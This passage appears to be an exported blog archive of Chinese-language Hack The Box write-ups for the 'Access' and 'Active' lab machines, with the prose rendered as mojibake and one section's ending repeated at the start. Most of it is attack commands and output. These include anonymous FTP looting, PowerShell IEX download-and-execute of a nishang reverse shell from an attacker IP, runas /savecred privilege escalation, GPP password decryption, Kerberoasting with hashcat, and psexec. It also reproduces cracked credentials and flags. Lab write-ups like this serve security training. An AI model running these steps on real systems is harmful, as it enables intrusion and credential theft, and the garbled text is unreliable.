æ‰¾åˆ°äº†å­˜å‚¨çš„ç™»å½•å‡­è¯\n\n```bash\nPS C:\\Users\\Public\\Desktop>dir\n\n    Directory: C:\\Users\\Public\\Desktop\n\nMode                LastWriteTime     Length Name                                                                                                                                                                  \n----                -------------     ------ ----                                                                                                                                                                  \n-a---         8/22/2018  10:18 PM       1870 ZKAccess3.5 Security System.lnk\n```\n\nåœ¨ public ç”¨æˆ·çš„æ¡Œé¢å‘ç°äº†ä¸€ä¸ªå¿«æ·æ–¹å¼æ–‡ä»¶ï¼ŒæŸ¥çœ‹ä¸€ä¸‹\n\n```bash\nPS C:\\Users\\Public\\Desktop> type \"ZKAccess3.5 Security System.lnk\"\nL?F?@ ??7???7???#?P/P?O? ?:i?+00?/C:\\R1M?:Windows???:?â–’M?:*wWindowsV1MV?System32???:?â–’MV?*?System32â–’X2P?:?\n                                                                                                           runas.exe???:1??:1?*Yrunas.exeâ–’L-K??E?C:\\Windows\\System32\\runas.exe#..\\..\\..\\Windows\\System32\\runas.exeC:\\ZKTeco\\ZKAccess3.5G/user:ACCESS\\Administrator /savecred \"C:\\ZKTeco\\ZKAccess3.5\\Access.exe\"'C:\\ZKTeco\\ZKAccess3.5\\img\\AccessNET.ico?%SystemDrive%\\ZKTeco\\ZKAccess3.5\\img\\AccessNET.ico%SystemDrive%\\ZKTeco\\ZKAccess3.5\\img\\AccessNET.ico?%?\n                       ?wN?â–’?]N?D.??Q???`?Xaccess?_???8{E?3\n                                                           O?j)?H???\n                                                                    )??[?_???8{E?3\n                                                                                  O?j)?H???\n                                                                                           )??[?        ??1SPS??XF?L8C???&?m?e*S-1-5-21-953262931-566350628-63446256-500\n```\n\nå¯ä»¥çœ‹åˆ°è¿™ä¸€è¡Œ\n\n```bash\n\\Windows\\System32\\runas.exeC:\\ZKTeco\\ZKAccess3.5G/user:ACCESS\\Administrator /savecred \"C:\\ZKTeco\\ZKAccess3.5\\Access.exe\"\n```\n\nè¿™é‡Œçš„æ„æ€æ˜¯ å¯ä»¥ä½¿ç”¨ administrator æƒé™è¿è¡Œ access.exe æ–‡ä»¶ï¼Œæˆ‘ä»¬æŠŠåé¢çš„ access.exe æ–‡ä»¶æ¢æˆæˆ‘ä»¬è‡ªå·±çš„å‘½ä»¤ï¼Œé‚£ä¸å°±å¯ä»¥ææƒäº†ï¼Ÿ\n\næˆ‘ä»¬æŠŠè¿™é‡Œçš„ access.exe æ¢æˆæˆ‘ä»¬çš„ nishang\n\n```bash\nrunas /user:ACCESS\\Administrator /savecred \"powershell iex(new-object net.webclient).downloadstring('http://10.10.14.9/nishang.ps1')\"\n```\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444                                                                                                                                                                                               1 â¨¯\nlistening on [any] 4444 ...\nconnect to [10.10.14.9] from (UNKNOWN) [10.10.10.98] 49166\nWindows PowerShell running as user Administrator on ACCESS\nCopyright (C) 2015 Microsoft Corporation. All rights reserved.\n\nPS C:\\Windows\\system32>whoami\naccess\\administrator\n```\n\næˆåŠŸæ‹¿åˆ° administrator æƒé™çš„ shell\n\n```bash\nPS C:\\users\\administrator\\desktop> type root.txt\n6e1586cc7ab230a8d297e8f933d904cf\n```\n\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶\n"},{"title":"Access - Hackthebox","url":"/2022/04/24/Hackthebox/Easy/Hackthebox-Access/","content":"\n# Hackthebox - Access\n\n# é¶åœºä¿¡æ¯\n\n![](Hackthebox-Access/c3023160-dbeb-4968-bb82-dc3dbb973934.png)\n\n# é¶åœºç±»å‹\n\n![](Hackthebox-Access/a47fb898-9304-46fb-87e6-6e87090a8865.png)\n\n# ä¿¡æ¯æ”¶é›†\n\n## Nmap\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.98 \nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-24 22:29 EDT\nNmap scan report for 10.10.10.98\nHost is up (0.34s latency).\nNot shown: 65532 filtered ports\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     Microsoft ftpd\n| ftp-syst: \n|_  SYST: Windows_NT\n23/tcp open  telnet?\n80/tcp open  http    Microsoft IIS httpd 7.5\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/7.5\n|_http-title: MegaCorp\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|phone|specialized\nRunning (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)\nOS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012\nAggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE (using port 23/tcp)\nHOP RTT       ADDRESS\n1   338.15 ms 10.10.14.1\n2   338.30 ms 10.10.10.98\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 89.52 seconds\n```\n\nè¿™é‡Œæœ‰ä¸ª ftpï¼Œä½¿ç”¨åŒ¿åç”¨æˆ·æŸ¥çœ‹\n\n## FTP\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ftp 10.10.10.98                                                                                                         \nConnected to 10.10.10.98.\n220 Microsoft FTP Service\nName (10.10.10.98:root): anonymous\n331 Anonymous access allowed, send identity (e-mail name) as password.\nPassword:\n230 User logged in.\nRemote system type is Windows_NT.\n```\n\nç™»å…¥åæœ‰ä¸¤ä¸ªæ–‡ä»¶å¤¹\n\n```bash\nftp> ls\n200 PORT command successful.\n125 Data connection already open; Transfer starting.\n08-23-18  09:16PM       <DIR>          Backups\n08-24-18  10:00PM       <DIR>          Engineer\n226 Transfer complete.\n```\n\nBackups å’Œ Engineer é‡Œåˆ†åˆ«æœ‰ä¸€ä¸ªæ–‡ä»¶\n\n```bash\nftp> ls backups\n200 PORT command successful.\n125 Data connection already open; Transfer starting.\n08-23-18  09:16PM              5652480 backup.mdb\n226 Transfer complete.\n```\n\n```bash\nftp> ls engineer\n200 PORT command successful.\n125 Data connection already open; Transfer starting.\n08-24-18  01:16AM                10870 Access Control.zip\n226 Transfer complete.\n```\n\nä½¿ç”¨ get ç»™å®ƒä¸‹è½½ä¸‹æ¥ï¼Œbackup.mdb æ¯”è¾ƒå¤§ï¼Œå¤šç­‰å¾…ä¸€ä¸‹\n\nå»æŸ¥çœ‹ä¸€ä¸‹ backup.mdb çš„æ–‡ä»¶\n\n# æ¼æ´åˆ©ç”¨\n\n## Zip\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# strings backup.mdb|grep access\naccess4u@security\n```\n\næˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªå¯†ç ï¼Œåº”è¯¥æ˜¯è§£å‹å¯†ç ï¼Œå»å°è¯•è§£å‹ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ls Access\\ Control.pst                                                              2 â¨¯\n'Access Control.pst'\n```\n\nè§£å‹æˆåŠŸ\n\n## PST\n\nä½¿ç”¨ readpst æ¥æå–æ–‡ä»¶\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# readpst Access\\ Control.pst \nOpening PST file and indexes...\nProcessing Folder \"Deleted Items\"\n        \"Access Control\" - 2 items done, 0 items skipped.\n```\n\nç„¶åæŸ¥çœ‹ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# cat Access\\ Control.mbox\n\nThe password for the â€œsecurityâ€ account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.\n```\n\nåœ¨é‡Œé¢æ‰¾åˆ°ä¸€ä¸ªå¯†ç \n\n```bash\nusername = security\npassword = 4Cc3ssC0ntr0ller\n```\n\nå»å°è¯•ç™»å½• 23 ç«¯å£\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# telnet 10.10.10.98                                \nTrying 10.10.10.98...\nConnected to 10.10.10.98.\nEscape character is '^]'.\nWelcome to Microsoft Telnet Service \n\nlogin: security\npassword: \n\n*===============================================================\nMicrosoft Telnet Server.\n*===============================================================\nC:\\Users\\security>whoami\naccess\\security\n```\n\næˆåŠŸæ‹¿åˆ°ä¸€ä¸ª user æƒé™çš„ shell\n\n```bash\nC:\\Users\\security\\Desktop>type user.txt\nff1f3b48913b213a31ff6756d2553d38\n```\n\næˆåŠŸå¾—åˆ°ä¸€ä¸ª user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\n\n```bash\nC:\\Users\\security>powershell whoami\naccess\\security\n```\n\nç¡®è®¤ powershell å­˜åœ¨å¹¶å¯æ‰§è¡Œå‘½ä»¤\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# cp /opt/shells/Invoke-PowerShellTcp.ps1 nishang.ps1\n```\n\næˆ‘ä»¬ä½¿ç”¨ nishang æ¥è¿›è¡Œææƒ\n\nä½¿ç”¨ python3 å¼€å¯ä¸€ä¸ª http æœåŠ¡\n\n```bash\npython3 -m http.server 80\n```\n\n```bash\nInvoke-PowerShellTcp -Reverse -IPAddress 10.10.14.9 -Port 4444\n```\n\nå°†ä¸Šé¢è¿™å¥ä»£ç æ·»åŠ åˆ° nishang æœ€åä¸€è¡Œï¼Œç„¶åä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nnc -nvlp 4444\n```\n\n```bash\npowershell \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.9/nishang.ps1')\"\n```\n\nç„¶åæ‰§è¡Œ\n\n```bash\nPS C:\\Users\\security>whoami\naccess\\security\n```\n\nç°åœ¨æˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªäº¤äº’å¼ shell äº†ï¼Œå…¶å®è¿™ä¸€æ­¥å¯ä»¥ä¸åšï¼Œä¸è¿‡æˆ‘å–œæ¬¢åœ¨ shell å†…è¾“å…¥å‘½ä»¤ï¼Œè€Œä¸èƒ½ä½¿ç”¨åˆ é™¤é”®å°±å¾ˆéš¾å—\n\n> [https://github.com/411Hall/JAWS](https://github.com/411Hall/JAWS)\n\næ¥ç€æˆ‘ä»¬ä½¿ç”¨ JAWS æ¥è¿›è¡Œæšä¸¾\n\n```bash\npowershell \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.9/jaws-enum.ps1')\"\n```\n\n```bash\ncmd.exe                   764 security /q /k C:\\Windows\\system32\\login.cmd\n```\n\nè¿™é‡Œçœ‹åˆ°äº†ä¸€ä¸ªæœ‰è¶£çš„ä¸œè¥¿ï¼Œæˆ‘ä»¬å¯ä»¥å»çœ‹çœ‹è¿™æ˜¯ä»€ä¹ˆ\n\n```bash\nC:\\Users\\security>type C:\\Windows\\system32\\login.cmd\n@echo off\nrem\nrem  Default global login script for the Telnet Server\nrem\nrem  In the default setup, this command script is executed when the\nrem  initial command shell is invoked.  It, in turn, will try to invoke\nrem  the individual user's login script.\nrem\n\necho *===============================================================\necho Microsoft Telnet Server.\necho *===============================================================\n\ncd /d %HOMEDRIVE%\\%HOMEPATH%\n```\n\nè¿™æ˜¯è„šæœ¬çš„å†…å®¹\n\n```bash\nC:\\Users\\security>cmdkey /list\n\nCurrently stored credentials:\n\n    Target: Domain:interactive=ACCESS\\Administrator\n                                                       Type: Domain Password\n    User: ACCESS\\Administrator\n```\n\nä½¿ç”¨ cmdkey /list æ‰¾åˆ°äº†å­˜å‚¨çš„ç™»å½•å‡­è¯\n\n```bash\nPS C:\\Users\\Public\\Desktop>dir\n\n    Directory: C:\\Users\\Public\\Desktop\n\nMode                LastWriteTime     Length Name                                                                                                                                                                  \n----                -------------     ------ ----                                                                                                                                                                  \n-a---         8/22/2018  10:18 PM       1870 ZKAccess3.5 Security System.lnk\n```\n\nåœ¨ public ç”¨æˆ·çš„æ¡Œé¢å‘ç°äº†ä¸€ä¸ªå¿«æ·æ–¹å¼æ–‡ä»¶ï¼ŒæŸ¥çœ‹ä¸€ä¸‹\n\n```bash\nPS C:\\Users\\Public\\Desktop> type \"ZKAccess3.5 Security System.lnk\"\nL?F?@ ??7???7???#?P/P?O? ?:i?+00?/C:\\R1M?:Windows???:?â–’M?:*wWindowsV1MV?System32???:?â–’MV?*?System32â–’X2P?:?\n                                                                                                           runas.exe???:1??:1?*Yrunas.exeâ–’L-K??E?C:\\Windows\\System32\\runas.exe#..\\..\\..\\Windows\\System32\\runas.exeC:\\ZKTeco\\ZKAccess3.5G/user:ACCESS\\Administrator /savecred \"C:\\ZKTeco\\ZKAccess3.5\\Access.exe\"'C:\\ZKTeco\\ZKAccess3.5\\img\\AccessNET.ico?%SystemDrive%\\ZKTeco\\ZKAccess3.5\\img\\AccessNET.ico%SystemDrive%\\ZKTeco\\ZKAccess3.5\\img\\AccessNET.ico?%?\n                       ?wN?â–’?]N?D.??Q???`?Xaccess?_???8{E?3\n                                                           O?j)?H???\n                                                                    )??[?_???8{E?3\n                                                                                  O?j)?H???\n                                                                                           )??[?        ??1SPS??XF?L8C???&?m?e*S-1-5-21-953262931-566350628-63446256-500\n```\n\nå¯ä»¥çœ‹åˆ°è¿™ä¸€è¡Œ\n\n```bash\n\\Windows\\System32\\runas.exeC:\\ZKTeco\\ZKAccess3.5G/user:ACCESS\\Administrator /savecred \"C:\\ZKTeco\\ZKAccess3.5\\Access.exe\"\n```\n\nè¿™é‡Œçš„æ„æ€æ˜¯ å¯ä»¥ä½¿ç”¨ administrator æƒé™è¿è¡Œ access.exe æ–‡ä»¶ï¼Œæˆ‘ä»¬æŠŠåé¢çš„ access.exe æ–‡ä»¶æ¢æˆæˆ‘ä»¬è‡ªå·±çš„å‘½ä»¤ï¼Œé‚£ä¸å°±å¯ä»¥ææƒäº†ï¼Ÿ\n\næˆ‘ä»¬æŠŠè¿™é‡Œçš„ access.exe æ¢æˆæˆ‘ä»¬çš„ nishang\n\n```bash\nrunas /user:ACCESS\\Administrator /savecred \"powershell iex(new-object net.webclient).downloadstring('http://10.10.14.9/nishang.ps1')\"\n```\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444                                                                                                                                                                                               1 â¨¯\nlistening on [any] 4444 ...\nconnect to [10.10.14.9] from (UNKNOWN) [10.10.10.98] 49166\nWindows PowerShell running as user Administrator on ACCESS\nCopyright (C) 2015 Microsoft Corporation. All rights reserved.\n\nPS C:\\Windows\\system32>whoami\naccess\\administrator\n```\n\næˆåŠŸæ‹¿åˆ° administrator æƒé™çš„ shell\n\n```bash\nPS C:\\users\\administrator\\desktop> type root.txt\n6e1586cc7ab230a8d297e8f933d904cf\n```\n\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶\n","tags":["Hackthebox"]},{"title":"Active - Hackthebox","url":"/2022/04/24/Hackthebox/Easy/Hackthebox-Active/","content":"\n# Hackthebox - Active\n\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Active/a289e434-5250-48bb-bf76-746fc219f445.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Active/69c80c61-a7ea-4908-907b-9e855792b26f.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.100\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-22 02:56 EDT\nNmap scan report for 10.10.10.100\nHost is up (0.32s latency).\nNot shown: 65513 closed ports\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)\n| dns-nsid: \n|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-22 06:57:01Z)\n135/tcp   open  msrpc?\n139/tcp   open  netbios-ssn?\n389/tcp   open  tcpwrapped\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5722/tcp  open  msdfsr?\n9389/tcp  open  mc-nmf        .NET Message Framing\n49152/tcp open  unknown\n49153/tcp open  msrpc         Microsoft Windows RPC\n49154/tcp open  unknown\n49155/tcp open  tcpwrapped\n49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49158/tcp open  tcpwrapped\n49165/tcp open  msrpc         Microsoft Windows RPC\n49170/tcp open  unknown\n49171/tcp open  unknown\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port139-TCP:V=7.91%I=7%D=4/22%Time=626251C0%P=x86_64-pc-linux-gnu%r(Get\nSF:Request,5,\"\\x83\\0\\0\\x01\\x8f\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=4/22%OT=53%CT=1%CU=38032%PV=Y%DS=2%DC=T%G=Y%TM=6262527\nOS:A%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10A%TI=I%CI=I%TS=7)SEQ(SP=1\nOS:05%GCD=1%ISR=10D%TI=I%CI=RD%II=I%SS=O%TS=7)SEQ(SP=105%GCD=1%ISR=10E%TI=R\nOS:D%CI=I%II=I%TS=A)OPS(O1=M505NW8ST11%O2=M505NW8ST11%O3=M505NW8NNT11%O4=M5\nOS:05NW8ST11%O5=M505NW8ST11%O6=M505ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000\nOS:%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M505NW8NNS%CC=N%Q=)T1(R=Y%DF\nOS:=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%\nOS:Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A\nOS:%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y\nOS:%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR\nOS:%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU\nOS:D=G)IE(R=Y%DFI=N%T=80%CD=Z)\n\nNetwork Distance: 2 hops\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows                                                                                                     \n\nHost script results:\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2022-04-22T06:58:32\n|_  start_date: 2022-04-22T06:55:19\n\nTRACEROUTE (using port 1025/tcp)\nHOP RTT       ADDRESS\n1   316.49 ms 10.10.14.1\n2   316.60 ms 10.10.10.100\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 216.91 seconds\n```\n## Smb\nè¿™é‡Œçœ‹åˆ°æœ‰ smbï¼Œå»æŸ¥çœ‹ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# smbmap -H 10.10.10.100                  \n[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                  \n        Disk                                           Permissions     Comment\n        ----                                           -----------     -------\n        ADMIN$                                         NO ACCESS       Remote Admin\n        C$                                             NO ACCESS       Default shar\n        IPC$                                           NO ACCESS       Remote IPC\n        NETLOGON                                       NO ACCESS       Logon server\n        Replication                                    READ ONLY\n        SYSVOL                                         NO ACCESS       Logon server\n        Users                                          NO ACCESS\n```\nè¿™é‡Œæœ‰ä¸€ä¸ª Replication ç›®å½•æ˜¯å¯ä»¥æŸ¥çœ‹çš„ï¼Œå»çœ‹ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# smbclient //10.10.10.100/Replication    \nEnter WORKGROUP\\root's password: \nAnonymous login successful\nTry \"help\" to get a list of possible commands.\nsmb: \\> dir\n  .                                   D        0  Sat Jul 21 06:37:44 2018\n  ..                                  D        0  Sat Jul 21 06:37:44 2018\n  active.htb                          D        0  Sat Jul 21 06:37:44 2018\n\n                5217023 blocks of size 4096. 249292 blocks available\n```\næœ‰ä¸ª active.htb æ–‡ä»¶å¤¹ï¼Œç»™ä¸‹è½½ä¸‹æ¥\n\n```bash\nrecurse ON\nprompt OFF\nmget *\n```\n```bash\nactive.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml\n```\nåœ¨ä¸Šé¢è¿™ä¸ªæ–‡ä»¶ä¸­æ‰¾åˆ°äº†ä¸€ä¸ªè´¦å·å’Œå¯†ç \n\n```bash\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<Groups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D24D26}\"><User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"active.htb\\SVC_TGS\" image=\"2\" changed=\"2018-07-18 20:46:06\" uid=\"{EF57DA28-5F69-4530-A59E-AAB58578219D}\"><Properties action=\"U\" newName=\"\" fullName=\"\" description=\"\" cpassword=\"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\" changeLogon=\"0\" noChange=\"1\" neverExpires=\"1\" acctDisabled=\"0\" userName=\"active.htb\\SVC_TGS\"/></User>\n</Groups>\n```\n```bash\nusername = active.htb\\SVC_TGS\ncpassword = edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVm\n```\n# æ¼æ´åˆ©ç”¨\nä½¿ç”¨ kali è‡ªå¸¦çš„ gpp-decrypt è¿›è¡Œè§£å¯†\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\nGPPstillStandingStrong2k18\n```\n```bash\nusername = SVC_TGS\npassword = GPPstillStandingStrong2k18\n```\nç°åœ¨æˆ‘ä»¬æœ‰äº†è´¦å·å¯†ç ï¼Œç»§ç»­å» smb é‡ŒæŸ¥çœ‹æ–‡ä»¶\n\n```bash\nsmbclient //10.10.10.100/Users -U SVC_TGS%GPPstillStandingStrong2k18\n```\n```bash\nsmb: \\> dir\n  .                                  DR        0  Sat Jul 21 10:39:20 2018\n  ..                                 DR        0  Sat Jul 21 10:39:20 2018\n  Administrator                       D        0  Mon Jul 16 06:14:21 2018\n  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009\n  Default                           DHR        0  Tue Jul 14 02:38:21 2009\n  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009\n  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009\n  Public                             DR        0  Tue Jul 14 00:57:55 2009\n  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018\n\n                5217023 blocks of size 4096. 279115 blocks available\n```\nä¼¼ä¹ç›´æ¥å°±è¿›ç³»ç»Ÿäº†ï¼Œå»æ‰¾æ‰¾çœ‹æœ‰æ²¡æœ‰æœ‰ä»·å€¼çš„æ–‡ä»¶\n\n```bash\ncd SVC_TGS\\Desktop\\\nget user.txt\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# cat user.txt   \na8644850ef3290ae34457a8ad9982d5e\n```\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\nè¿™å°æœºå™¨çš„ 88 ç«¯å£è¿è¡Œç€ k8s(kerberos)ï¼Œå’±ä»¬å¯ä»¥ç”¨ impacket æ¥è¿›è¡Œåˆ©ç”¨\n\n> [https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)\n\næ¥ç€æŠŠè¿™å°é¶æœºåŠ å…¥åˆ° hostsé‡Œ\n\n```bash\necho 10.10.10.100 active.htb >> /etc/hosts\n```\nç„¶åä½¿ç”¨è¿™ä¸ªå·¥å…·\n\n```bash\npython3 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/impacket/examples]\nâ””â”€# python3 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18\nImpacket v0.9.25.dev1+20220420.234604.17ae0913 - Copyright 2021 SecureAuth Corporation\n\nServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation \n--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------\nactive/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2022-04-22 02:56:29.468554             \n\n[-] CCache file is not found. Skipping...\n$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$65399e5d81a676e87013d1d2c95a9919$831e286d069ed4766f092217ea7ed3e87d62dd0d864b137ef449c0fe02bd6d418c6ea56c01254956638d0b0e6f9868bab37574dc0bdc29f47106d8d4f96d9f87ceb62920f566339adfc5ec5d2761a97a7843be5b750a38b8f0aa42f67b3c1dd909fa1832796d43b2be9830c78450c46802a3c266a0000d0c898b003edbe894fc11e4746382b5a422e04fa23096c50d3330fa9bcae382771bcc528c090c245327d968f1bb06f345dc2d44cf92624eea731e7467f5a6dfb6c90d016bc716de3ba2128a428e7d0b4529dcad6a4d59b1780f7ef863580a1e56348eb12cb865e21c5ce047d289762b0c2ae694db3ffed75416c9cda974a3e4ca591cf25288a0278d4ff4e971013e74c5dcb2321e6b228de3617ed8f53705443dfa858d732f39df31d153ea5dfed178961933883613c692856a381c68f00a7821f77682b9d303a0c7e9af9f24cb6de1ccb5a1d74b7de0d3952669f4ea1d730a5cfabe52a970a6d38013934bea4cc175c2cdcb0da52087fb5599a769e8f50c90535c46e28a081791eb56377d67eb9b8334e89c15c25268ad9af9cea1b4d44cbd3eb5c5d431bab1aabe922fa75af954ec75b024351dd1d22a2df3d2d9f968d191fd456062f22e11c6af3d64ca9ee0bae77f933e5e1879f9f45b50e88a6de5278fffcdc20a99fde8e6e305b3bb213584d5c047df73f432386500dde52cfc1fc277399979a8b5955008aad50cbcfa359ddd6d634b99064663a49a2f477b4d2d8d21ffd8fdf9ccc43b10db9b58964e198444881f96ce700c9dc6cb6c4192274cd7e52c7340f2c052909a9bc78e6dee1b7758f07ac32154d3f4fd01fa776520c514de5e6c3ba53ea0b2c81d9e8c1d0124b3467610038423bd14dbdbc863ddc9d0dfd8d768a3682ee7da66d38c3e7d31937c1eb5813d4997377649be0b14487de5cf23be190c7f20cec1f47afa101829fbf3e12320481ca79f6254e2462dadae248020ed5b0bfff84367f33f101f734ff5727eaa101a4faaeadf267d20b3211583d7794c0892a62b6dc25caafc96c17f21ef1585aa6b95b89aa831a22959e145b490364aa28c42ea79763a1db3ef5159558e6898faaf40e5757e3d7889308ec79ae1d2d721ea98b2e79914d85380c4385d62ee308caa77982c84eaaccc84b19cc69d16b4ae471b270b66c02b16f450c109e58cd5e524d20b092c62ce573115d204825121da3913418a596157b6274c3ac653d352f10983b08046de6e3ab6715169dbf250bf0212\n```\næŠŠè¿™æ®µ hash ä¿å­˜ä¸‹æ¥ï¼Œç„¶åä½¿ç”¨ hashcat è¿›è¡Œçˆ†ç ´\n\n```bash\nhashcat hash /usr/share/wordlists/rockyou.txt -m 13100\n\nTicketmaster1968\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/impacket/examples]\nâ””â”€# python3 psexec.py Administrator:Ticketmaster1968@10.10.10.100                                                                                                                                               1 âš™\nImpacket 